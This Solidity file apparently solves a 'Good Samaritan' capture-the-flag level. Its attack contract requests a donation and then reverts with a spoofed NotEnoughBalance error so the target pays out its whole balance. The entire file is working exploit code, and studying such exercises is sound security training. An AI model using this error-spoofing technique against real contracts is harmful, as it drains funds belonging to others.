// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract GoodSamaritanAttack {

    error NotEnoughBalance();

    constructor(){}

    function attax(address _target) external {
        GoodSamaritan goodsamaritan  = GoodSamaritan(_target);
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}